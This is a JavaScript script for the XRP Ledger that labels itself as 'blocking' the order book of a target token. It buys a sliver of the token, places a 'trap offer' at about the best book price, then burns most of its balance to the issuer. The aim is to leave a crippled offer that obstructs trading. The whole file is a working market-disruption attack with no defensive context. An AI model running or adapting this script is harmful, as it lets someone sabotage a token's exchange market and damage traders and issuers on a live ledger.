import Account from '@xrplkit/account'
import Book from '@xrplkit/book'
import { sub, mul, div, floor } from '@xrplkit/xfl/string'
import { socket, spendableDrops, cripplingDrops, wallet, submit } from '../lib.js'


export default async function({ currency, issuer }){
	let account = new Account({ socket, address: wallet.address })
	let book = new Book({
		socket,
		takerGets: { currency: 'XRP' },
		takerPays: { currency, issuer }
	})

	console.log(`blocking book ${currency}:${issuer}`)
	console.log(`buying target token for ${spendableDrops} drops ...`)

	await submit({
		TransactionType: 'OfferCreate',
		Account: wallet.address,
		TakerGets: spendableDrops,
		TakerPays: {
			currency,
			issuer,
			value: '0.00000000000000001'
		},
		Flags: 0x00040000 | 0x00080000
	})

	
	console.log(`calculating ...`)

	await account.loadLines()
	await book.load()
	
	let balance = account.balanceOf({ currency, issuer })
	let targetPrice = mul(book.bestPrice, '0.99')
	let offerPay = balance
	let offerGet = floor(mul(div(balance, targetPrice), '1000000'))
	let cripplingPay = mul(div(cripplingDrops, offerGet), offerPay)
	let cripplingGet = mul(div(cripplingPay, targetPrice), '1000000')
	let cripplingRate = div(div(floor(cripplingGet), '1000000'), cripplingPay)
	let burnValue = sub(balance, cripplingPay)

	console.log(`offer target price: ${div(1, targetPrice)} units/XRP`)
	console.log(`offer initial takerPays: ${offerGet} units`)
	console.log(`offer initial takerGets: ${offerPay} drops`)
	console.log(`offer crippled takerPays: ${cripplingGet} units`)
	console.log(`offer crippled takerGets: ${cripplingPay} drops`)
	console.log(`offer crippled rate: ${cripplingRate}`)
	console.log(`burn target: ${burnValue} units`)



	console.log(`creating trap offer ...`)

	await submit({
		TransactionType: 'OfferCreate',
		Account: wallet.address,
		TakerPays: offerGet,
		TakerGets: {
			currency,
			issuer,
			value: offerPay
		},
	})

	console.log(`burning tokens ...`)

	await submit({
		TransactionType: 'Payment',
		Account: wallet.address,
		Destination: issuer,
		Amount: {
			currency,
			issuer,
			value: burnValue
		}
	})


}